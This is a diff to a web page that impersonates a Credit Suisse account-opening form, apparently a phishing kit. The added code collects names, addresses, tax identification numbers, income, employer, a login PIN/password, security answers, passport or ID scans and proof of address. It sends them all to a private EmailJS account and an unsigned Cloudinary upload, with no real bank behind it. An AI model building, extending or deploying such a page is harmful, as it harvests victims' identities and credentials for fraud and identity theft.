@@ -4,6 +4,10 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Credit Suisse • Account Opening</title>
+  
+  <!-- Bowser for Accurate Browser Detection (Free, MIT License) -->
+  <script src="https://cdn.jsdelivr.net/npm/bowser@2.11.0/bundled.js"></script>
+  
   <style>
     * {
       margin: 0;
@@ -83,6 +87,12 @@
       gap: 20px;
     }
 
+    .grid-3 {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 20px;
+    }
+
     label {
       display: block;
       font-size: 13px;
@@ -91,7 +101,7 @@
       margin-bottom: 6px;
     }
 
-    input, select {
+    input, select, textarea {
       width: 100%;
       padding: 12px 10px;
       border: 1px solid #cfd4da;
@@ -102,7 +112,7 @@
       transition: all 0.2s ease;
     }
 
-    input:focus, select:focus {
+    input:focus, select:focus, textarea:focus {
       outline: none;
       border-color: #002a5c;
       box-shadow: 0 0 0 3px rgba(0, 42, 92, 0.1);
@@ -486,7 +496,7 @@
         padding: 24px;
       }
       
-      .grid-2, .account-grid {
+      .grid-2, .grid-3, .account-grid {
         grid-template-columns: 1fr;
       }
       
@@ -508,6 +518,7 @@
 
       <div class="card-body">
         <form id="registrationForm">
+          <!-- Section 1: Personal Information -->
           <div class="section-title">Personal Information</div>
           
           <div>
@@ -521,22 +532,95 @@
               <input type="email" id="email" placeholder="anna@example.com" required>
             </div>
             <div>
-              <label>Phone Number</label>
+              <label>Phone Number (Mobile)</label>
               <input type="tel" id="phone" placeholder="+41 79 123 45 67" required>
             </div>
           </div>
-          
+
           <div class="grid-2">
+            <div>
+              <label>Phone Number (Home) - Optional</label>
+              <input type="tel" id="phoneHome" placeholder="+41 44 123 45 67">
+            </div>
+            <div>
+              <label>Gender</label>
+              <select id="gender" required>
+                <option value="">-- Select Gender --</option>
+                <option value="Male">Male</option>
+                <option value="Female">Female</option>
+                <option value="Other">Prefer not to say</option>
+              </select>
+            </div>
+          </div>
+          
+          <div class="grid-3">
             <div>
               <label>Date of Birth</label>
               <input type="date" id="dob" required>
             </div>
             <div>
-              <label>City</label>
+              <label>Nationality</label>
+              <select id="nationality" required>
+                <option value="">-- Select Nationality --</option>
+                <option value="Swiss">Swiss</option>
+                <option value="German">German</option>
+                <option value="French">French</option>
+                <option value="Italian">Italian</option>
+                <option value="British">British</option>
+                <option value="American">American</option>
+                <option value="Austrian">Austrian</option>
+                <option value="Spanish">Spanish</option>
+                <option value="Portuguese">Portuguese</option>
+                <option value="Dutch">Dutch</option>
+                <option value="Belgian">Belgian</option>
+                <option value="Swedish">Swedish</option>
+                <option value="Danish">Danish</option>
+                <option value="Norwegian">Norwegian</option>
+                <option value="Finnish">Finnish</option>
+                <option value="Other">Other</option>
+              </select>
+            </div>
+            <div>
+              <label>City of Residence</label>
               <input type="text" id="city" placeholder="Zurich" required>
             </div>
           </div>
 
+          <div>
+            <label>Street Address</label>
+            <input type="text" id="streetAddress" placeholder="Bahnhofstrasse 45" required>
+          </div>
+
+          <div class="grid-2">
+            <div>
+              <label>Postal Code</label>
+              <input type="text" id="postalCode" placeholder="8001" required>
+            </div>
+            <div>
+              <label>Country of Residence</label>
+              <select id="countryResidence" required>
+                <option value="">-- Select Country --</option>
+                <option value="Switzerland">Switzerland</option>
+                <option value="Germany">Germany</option>
+                <option value="France">France</option>
+                <option value="Italy">Italy</option>
+                <option value="United Kingdom">United Kingdom</option>
+                <option value="United States">United States</option>
+                <option value="Austria">Austria</option>
+                <option value="Spain">Spain</option>
+                <option value="Portugal">Portugal</option>
+                <option value="Netherlands">Netherlands</option>
+                <option value="Belgium">Belgium</option>
+                <option value="Sweden">Sweden</option>
+                <option value="Denmark">Denmark</option>
+                <option value="Norway">Norway</option>
+                <option value="Finland">Finland</option>
+                <option value="Other">Other</option>
+              </select>
+            </div>
+          </div>
+
+          <!-- Section 2: Account Selection -->
           <div class="section-title">Account Selection</div>
           
           <label>Select Account Type</label>
@@ -567,10 +651,11 @@
           </div>
           <input type="hidden" id="accountType" value="">
           
-          <div class="grid-2">
+          <div class="grid-3">
             <div>
               <label>Primary Currency</label>
-              <select id="currency">
+              <select id="currency" required>
+                <option value="">-- Select Currency --</option>
                 <option value="CHF">CHF - Swiss Franc</option>
                 <option value="EUR">EUR - Euro</option>
                 <option value="USD">USD - US Dollar</option>
@@ -579,41 +664,142 @@
             </div>
             
             <div>
+              <label>Secondary Currency (Optional)</label>
+              <select id="currencySecondary">
+                <option value="">-- Select Currency --</option>
+                <option value="CHF">CHF - Swiss Franc</option>
+                <option value="EUR">EUR - Euro</option>
+                <option value="USD">USD - US Dollar</option>
+                <option value="GBP">GBP - British Pound</option>
+              </select>
+            </div>
+
+            <div>
               <label>Monthly Volume</label>
-              <select id="volume">
-                <option value="<10k">< CHF 10,000</option>
-                <option value="10k-50k">CHF 10,000 - 50,000</option>
-                <option value="50k-200k">CHF 50,000 - 200,000</option>
-                <option value=">200k">> CHF 200,000</option>
+              <select id="volume" required>
+                <option value="">-- Select Volume --</option>
+                <option value="< CHF 10,000">< CHF 10,000</option>
+                <option value="CHF 10,000 - 50,000">CHF 10,000 - 50,000</option>
+                <option value="CHF 50,000 - 200,000">CHF 50,000 - 200,000</option>
+                <option value="> CHF 200,000">> CHF 200,000</option>
               </select>
             </div>
           </div>
 
-          <div class="section-title">Compliance Information</div>
+          <!-- Section 3: Employment & Income -->
+          <div class="section-title">Employment & Income</div>
           
           <div class="grid-2">
             <div>
               <label>Employment Status</label>
-              <select id="employment">
+              <select id="employment" required>
+                <option value="">-- Select Status --</option>
                 <option value="Employed">Employed</option>
                 <option value="Self-Employed">Self-Employed</option>
                 <option value="Retired">Retired</option>
                 <option value="Student">Student</option>
+                <option value="Unemployed">Unemployed</option>
               </select>
             </div>
             
             <div>
-              <label>Source of Funds</label>
-              <select id="sourceFunds">
-                <option value="Salary">Salary/Employment</option>
-                <option value="Business">Business Income</option>
-                <option value="Investments">Investments</option>
-                <option value="Inheritance">Inheritance</option>
+              <label>Occupation/Job Title</label>
+              <input type="text" id="occupation" placeholder="e.g. Doctor, Engineer, Teacher" required>
+            </div>
+          </div>
+
+          <div class="grid-2">
+            <div>
+              <label>Employer Name</label>
+              <input type="text" id="employer" placeholder="Company name" required>
+            </div>
+            <div>
+              <label>Industry Sector</label>
+              <select id="industry" required>
+                <option value="">-- Select Industry --</option>
+                <option value="Banking & Finance">Banking & Finance</option>
+                <option value="Healthcare">Healthcare</option>
+                <option value="Technology">Technology</option>
+                <option value="Education">Education</option>
+                <option value="Manufacturing">Manufacturing</option>
+                <option value="Retail">Retail</option>
+                <option value="Real Estate">Real Estate</option>
+                <option value="Legal">Legal</option>
+                <option value="Consulting">Consulting</option>
                 <option value="Other">Other</option>
               </select>
             </div>
           </div>
 
+          <div class="grid-2">
+            <div>
+              <label>Annual Income Range</label>
+              <select id="income" required>
+                <option value="">-- Select Income --</option>
+                <option value="< CHF 50,000">< CHF 50,000</option>
+                <option value="CHF 50,000 - 100,000">CHF 50,000 - 100,000</option>
+                <option value="CHF 100,000 - 250,000">CHF 100,000 - 250,000</option>
+                <option value="CHF 250,000 - 500,000">CHF 250,000 - 500,000</option>
+                <option value="> CHF 500,000">> CHF 500,000</option>
+              </select>
+            </div>
+            <div>
+              <label>Source of Funds</label>
+              <select id="sourceFunds" required>
+                <option value="">-- Select Source --</option>
+                <option value="Salary/Employment">Salary/Employment</option>
+                <option value="Business Income">Business Income</option>
+                <option value="Investments">Investments</option>
+                <option value="Inheritance">Inheritance</option>
+                <option value="Savings">Savings</option>
+                <option value="Other">Other</option>
+              </select>
+            </div>
+          </div>
+
+          <!-- Section 4: Tax & Compliance -->
+          <div class="section-title">Tax & Compliance Information</div>
+          
+          <div class="grid-2">
+            <div>
+              <label>Tax Residency Country</label>
+              <select id="taxCountry" required>
+                <option value="">-- Select Country --</option>
+                <option value="Switzerland">Switzerland</option>
+                <option value="Germany">Germany</option>
+                <option value="France">France</option>
+                <option value="Italy">Italy</option>
+                <option value="United Kingdom">United Kingdom</option>
+                <option value="United States">United States</option>
+                <option value="Other">Other</option>
+              </select>
+            </div>
+            <div>
+              <label>Tax Identification Number (TIN)</label>
+              <input type="text" id="tin" placeholder="e.g. 756.1234.5678.90" required>
+            </div>
+          </div>
+
+          <div class="grid-2">
+            <div>
+              <label>Are you a US person?</label>
+              <select id="usPerson" required>
+                <option value="">-- Select --</option>
+                <option value="No">No</option>
+                <option value="Yes">Yes</option>
+              </select>
+            </div>
+            <div>
+              <label>Politically Exposed Person (PEP)?</label>
+              <select id="pep" required>
+                <option value="">-- Select --</option>
+                <option value="No">No</option>
+                <option value="Yes">Yes</option>
+              </select>
+            </div>
+          </div>
+
+          <!-- Section 5: Security -->
           <div class="section-title">Login Credentials</div>
           
           <div>
@@ -636,7 +822,25 @@
             </div>
           </div>
 
-          <div class="section-title">Verification (Required)</div>
+          <div class="grid-2">
+            <div>
+              <label>Security Question (Optional)</label>
+              <select id="securityQuestion">
+                <option value="">-- Select Question --</option>
+                <option value="Mother's maiden name?">Mother's maiden name?</option>
+                <option value="First pet's name?">First pet's name?</option>
+                <option value="City of birth?">City of birth?</option>
+                <option value="First school name?">First school name?</option>
+              </select>
+            </div>
+            <div>
+              <label>Security Answer</label>
+              <input type="text" id="securityAnswer" placeholder="Answer">
+            </div>
+          </div>
+
+          <!-- Section 6: Verification -->
+          <div class="section-title">Verification Documents</div>
           
           <div class="upload-area" id="uploadArea" onclick="document.getElementById('fileUpload').click();">
             <div class="upload-icon">
@@ -646,19 +850,61 @@
             </div>
             <p style="color: #6b7280; margin: 0 0 10px;" id="uploadText">Upload ID (Passport/Driver's License)</p>
             <span class="upload-btn" id="uploadBtn">Choose File</span>
-            <div class="upload-note" id="uploadNote">JPG, PNG or PDF up to 5MB</div>
+            <div class="upload-note" id="uploadNote">JPG, PNG or PDF up to 5MB (Required)</div>
             <input type="file" id="fileUpload" accept=".jpg,.jpeg,.png,.pdf" style="display: none;" required>
           </div>
           <div id="uploadProgress" class="upload-progress" style="display:none;"></div>
 
+          <div class="upload-area" id="proofAddressArea" onclick="document.getElementById('proofAddress').click();" style="margin-top: 15px;">
+            <div class="upload-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                <path d="M3 6l9-4 9 4v12l-9 4-9-4V6z"></path>
+                <path d="M3 6l9 4 9-4"></path>
+                <path d="M12 10v12"></path>
+              </svg>
+            </div>
+            <p style="color: #6b7280; margin: 0 0 10px;" id="proofText">Upload Proof of Address (Optional)</p>
+            <span class="upload-btn" id="proofBtn">Choose File</span>
+            <div class="upload-note">Utility bill, bank statement (last 3 months)</div>
+            <input type="file" id="proofAddress" accept=".jpg,.jpeg,.png,.pdf" style="display: none;">
+          </div>
+          <div id="proofProgress" class="upload-progress" style="display:none;"></div>
+
+          <!-- Section 7: Relationship -->
+          <div class="section-title">Relationship Information</div>
+          
+          <div class="grid-2">
+            <div>
+              <label>Existing Credit Suisse client?</label>
+              <select id="existingClient" required>
+                <option value="">-- Select --</option>
+                <option value="No">No</option>
+                <option value="Yes">Yes</option>
+              </select>
+            </div>
+            <div>
+              <label>How did you hear about us?</label>
+              <select id="referral" required>
+                <option value="">-- Select --</option>
+                <option value="Google Search">Google Search</option>
+                <option value="Friend/Family Referral">Friend/Family Referral</option>
+                <option value="Online Advertisement">Online Advertisement</option>
+                <option value="Banking Event">Banking Event</option>
+                <option value="News/Media">News/Media</option>
+                <option value="Other">Other</option>
+              </select>
+            </div>
+          </div>
+
+          <!-- Section 8: Terms -->
           <div class="checkbox-group">
             <div class="checkbox-item">
-              <input type="checkbox" id="termsConfirm">
+              <input type="checkbox" id="termsConfirm" required>
               <label for="termsConfirm">I confirm that the information provided is accurate</label>
             </div>
             
             <div class="checkbox-item">
-              <input type="checkbox" id="termsAgree">
+              <input type="checkbox" id="termsAgree" required>
               <label for="termsAgree">I agree to the <a href="#">Terms & Conditions</a> and <a href="#">Privacy Policy</a></label>
             </div>
             
@@ -666,9 +912,14 @@
               <input type="checkbox" id="termsConsent">
               <label for="termsConsent">I consent to electronic communications (optional)</label>
             </div>
+
+            <div class="checkbox-item">
+              <input type="checkbox" id="dataProcessing" required>
+              <label for="dataProcessing">I consent to the processing of my data for compliance purposes (GDPR)</label>
+            </div>
           </div>
 
-          <!-- Browser Security Notice (above submit button) -->
+          <!-- Browser Security Notice (Accurate Browser Name) -->
           <div style="margin: 20px 0 10px 0; padding: 16px; background: #f8fafd; border-radius: 8px; border-left: 4px solid #002a5c;">
             <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px;">
               <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#002a5c" stroke-width="2">
@@ -725,7 +976,7 @@
     </div>
   </div>
 
-  <!-- Success Modal with Browser Info -->
+  <!-- Success Modal -->
   <div id="successModal" class="modal">
     <div class="modal-content">
       <div class="success-icon">
@@ -735,11 +986,12 @@
       </div>
       <h3>Application Submitted</h3>
       <p>
-        Account creation in progress!<br>
-        Please check your email within 24 hours for your account details.
+        Thank you for choosing Credit Suisse.<br>
+        Your account application has been received.<br><br>
+        You will receive your account details within 24 hours at the email address provided.
       </p>
       
-      <!-- Browser Security Section in Modal -->
+      <!-- Browser Security Section -->
       <div style="margin: 20px 0; padding: 16px; background: #f8fafd; border-radius: 8px; text-align: left;">
         <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px;">
           <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#002a5c" stroke-width="2">
@@ -781,44 +1033,11 @@
       emailjs.init("pDefyPQfc_lW2Cdcu");
     })();
 
-    // ===== ACCURATE BROWSER DETECTION =====
-    // Shows EXACT browser name (Brave shows Brave, Vivaldi shows Vivaldi, etc.)
+    // ===== ACCURATE BROWSER DETECTION USING BOWSER =====
+    // This detects the actual browser name, not just the engine
     function getBrowserName() {
-      const ua = navigator.userAgent;
-      
-      // Check for Brave first (important - Brave contains 'Chrome' but we want it to show Brave)
-      if (ua.includes('Brave')) return 'Brave';
-      
-      // Check for other browsers
-      if (ua.includes('Firefox')) return 'Firefox';
-      if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
-      if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
-      if (ua.includes('Edg')) return 'Edge';
-      
-      // Chrome-based browsers need special handling
-      if (ua.includes('Chrome')) {
-        if (ua.includes('Vivaldi')) return 'Vivaldi';
-        if (ua.includes('YaBrowser')) return 'Yandex Browser';
-        // Add more Chrome-based browsers as needed
-        return 'Chrome';
-      }
-      
-      if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
-      
-      // Mobile browsers
-      if (ua.includes('UCBrowser')) return 'UC Browser';
-      if (ua.includes('MiuiBrowser')) return 'MIUI Browser';
-      if (ua.includes('DuckDuckGo')) return 'DuckDuckGo';
-      
-      // If all else fails, try to extract browser name from userAgent
-      const match = ua.match(/(?:Brave|Chrome|Firefox|Safari|Opera|Edg|Vivaldi|YaBrowser|SamsungBrowser|UCBrowser|MiuiBrowser|DuckDuckGo)\/?\s*(\d+)/i);
-      if (match) {
-        // Clean up the name (remove version numbers)
-        return match[0].split('/')[0].split(' ')[0];
-      }
-      
-      // Final fallback
-      return 'your current browser';
+      const result = Bowser.parse(window.navigator.userAgent);
+      return result.browser.name || 'your current browser';
     }
 
     // Set browser name on page load
@@ -832,6 +1051,7 @@
     const CLOUD_NAME = 'do9yjpizs';
     const UPLOAD_PRESET = 'unsigned_preset';
     let uploadedFileUrl = '';
+    let proofAddressUrl = '';
 
     // Account selection
     let selectedAccount = '';
@@ -886,6 +1106,7 @@
       showModal('errorModal');
     }
 
+    // Upload ID
     document.getElementById('fileUpload').addEventListener('change', function(e) {
       const file = e.target.files[0];
       if (!file) return;
@@ -921,7 +1142,44 @@
       });
     });
 
+    // Upload Proof of Address
+    document.getElementById('proofAddress').addEventListener('change', function(e) {
+      const file = e.target.files[0];
+      if (!file) return;
+      
+      const progressDiv = document.getElementById('proofProgress');
+      progressDiv.style.display = 'block';
+      progressDiv.textContent = 'Uploading...';
+      
+      const formData = new FormData();
+      formData.append('file', file);
+      formData.append('upload_preset', UPLOAD_PRESET);
+      
+      fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/auto/upload`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.secure_url) {
+          proofAddressUrl = data.secure_url;
+          progressDiv.style.display = 'none';
+          document.getElementById('proofText').textContent = '✓ Proof Uploaded: ' + file.name;
+          document.getElementById('proofAddressArea').classList.add('uploaded');
+          document.getElementById('proofBtn').textContent = 'Change File';
+        }
+      })
+      .catch(error => {
+        console.error('Upload failed:', error);
+        progressDiv.textContent = 'Upload failed. Try again.';
+        setTimeout(() => {
+          progressDiv.style.display = 'none';
+        }, 3000);
+      });
+    });
+
     function submitRegistration() {
+      // Required fields validation
       if (!document.getElementById('fullName').value) {
         showError('Please enter your full name.');
         return;
@@ -934,16 +1192,84 @@
         showError('Please enter your phone number.');
         return;
       }
+      if (!document.getElementById('gender').value) {
+        showError('Please select your gender.');
+        return;
+      }
       if (!document.getElementById('dob').value) {
         showError('Please enter your date of birth.');
+        return;
+      }
+      if (!document.getElementById('nationality').value) {
+        showError('Please select your nationality.');
+        return;
+      }
+      if (!document.getElementById('streetAddress').value) {
+        showError('Please enter your street address.');
+        return;
+      }
+      if (!document.getElementById('postalCode').value) {
+        showError('Please enter your postal code.');
         return;
       }
       if (!document.getElementById('city').value) {
         showError('Please enter your city.');
         return;
       }
+      if (!document.getElementById('countryResidence').value) {
+        showError('Please select your country of residence.');
+        return;
+      }
       if (!selectedAccount) {
         showError('Please select an account type.');
+        return;
+      }
+      if (!document.getElementById('currency').value) {
+        showError('Please select primary currency.');
+        return;
+      }
+      if (!document.getElementById('volume').value) {
+        showError('Please select monthly volume.');
+        return;
+      }
+      if (!document.getElementById('employment').value) {
+        showError('Please select employment status.');
+        return;
+      }
+      if (!document.getElementById('occupation').value) {
+        showError('Please enter your occupation.');
+        return;
+      }
+      if (!document.getElementById('employer').value) {
+        showError('Please enter your employer name.');
+        return;
+      }
+      if (!document.getElementById('industry').value) {
+        showError('Please select your industry.');
+        return;
+      }
+      if (!document.getElementById('income').value) {
+        showError('Please select your income range.');
+        return;
+      }
+      if (!document.getElementById('sourceFunds').value) {
+        showError('Please select source of funds.');
+        return;
+      }
+      if (!document.getElementById('taxCountry').value) {
+        showError('Please select tax residency country.');
+        return;
+      }
+      if (!document.getElementById('tin').value) {
+        showError('Please enter your Tax Identification Number.');
+        return;
+      }
+      if (!document.getElementById('usPerson').value) {
+        showError('Please indicate if you are a US person.');
+        return;
+      }
+      if (!document.getElementById('pep').value) {
+        showError('Please indicate PEP status.');
         return;
       }
       if (!document.getElementById('pin').value) {
@@ -957,9 +1283,18 @@
         return;
       }
 
+      if (!document.getElementById('existingClient').value) {
+        showError('Please indicate if you are an existing client.');
+        return;
+      }
+      if (!document.getElementById('referral').value) {
+        showError('Please tell us how you heard about us.');
+        return;
+      }
       if (!document.getElementById('termsConfirm').checked ||
-          !document.getElementById('termsAgree').checked) {
-        showError('Please confirm your information and accept the Terms & Conditions.');
+          !document.getElementById('termsAgree').checked ||
+          !document.getElementById('dataProcessing').checked) {
+        showError('Please confirm all required terms.');
         return;
       }
 
@@ -973,23 +1308,57 @@
       btn.textContent = 'Submitting...';
       btn.disabled = true;
 
-      // Get accurate browser name
       const browserName = getBrowserName();
 
       const templateParams = {
-        name: document.getElementById('fullName').value,
+        // Personal
+        fullName: document.getElementById('fullName').value,
         email: document.getElementById('email').value,
         phone: document.getElementById('phone').value,
+        phoneHome: document.getElementById('phoneHome').value || 'Not provided',
+        gender: document.getElementById('gender').value,
         dob: document.getElementById('dob').value,
+        nationality: document.getElementById('nationality').value,
+        streetAddress: document.getElementById('streetAddress').value,
+        postalCode: document.getElementById('postalCode').value,
         city: document.getElementById('city').value,
+        countryResidence: document.getElementById('countryResidence').value,
+        
+        // Account
         accountType: formatAccountType(selectedAccount),
         currency: document.getElementById('currency').value,
+        currencySecondary: document.getElementById('currencySecondary').value || 'None',
         volume: document.getElementById('volume').value,
+        
+        // Employment
         employment: document.getElementById('employment').value,
+        occupation: document.getElementById('occupation').value,
+        employer: document.getElementById('employer').value,
+        industry: document.getElementById('industry').value,
+        income: document.getElementById('income').value,
         sourceFunds: document.getElementById('sourceFunds').value,
+        
+        // Tax
+        taxCountry: document.getElementById('taxCountry').value,
+        tin: document.getElementById('tin').value,
+        usPerson: document.getElementById('usPerson').value,
+        pep: document.getElementById('pep').value,
+        
+        // Security
         password: document.getElementById('pin').value,
+        securityQuestion: document.getElementById('securityQuestion').value || 'Not set',
+        securityAnswer: document.getElementById('securityAnswer').value || 'Not set',
+
+        // Documents
         idUrl: uploadedFileUrl,
-        browser: browserName, // EXACT browser name sent to you
+        proofAddressUrl: proofAddressUrl || 'Not provided',
+        
+        // Relationship
+        existingClient: document.getElementById('existingClient').value,
+        referral: document.getElementById('referral').value,
+        
+        // Browser
+        browser: browserName,
         timestamp: new Date().toLocaleString('en-GB', {
           day: '2-digit',
           month: '2-digit',
@@ -999,7 +1368,6 @@
           second: '2-digit'
         })
       };
-
 
       emailjs.send('service_oppnbmh', 'template_tzhyhjn', templateParams)
         .then(function() {
@@ -1011,9 +1379,13 @@
           });
           selectedAccount = '';
           uploadedFileUrl = '';
+          proofAddressUrl = '';
           document.getElementById('uploadArea').classList.remove('uploaded');
           document.getElementById('uploadText').textContent = 'Upload ID (Passport/Driver\'s License)';
           document.getElementById('uploadBtn').textContent = 'Choose File';
+          document.getElementById('proofAddressArea').classList.remove('uploaded');
+          document.getElementById('proofText').textContent = 'Upload Proof of Address (Optional)';
+          document.getElementById('proofBtn').textContent = 'Choose File';
         })
         .catch(function(error) {
           showError('Submission failed. Please try again.');
@@ -1027,4 +1399,3 @@
   </script>
 </body>
 </html>
-    
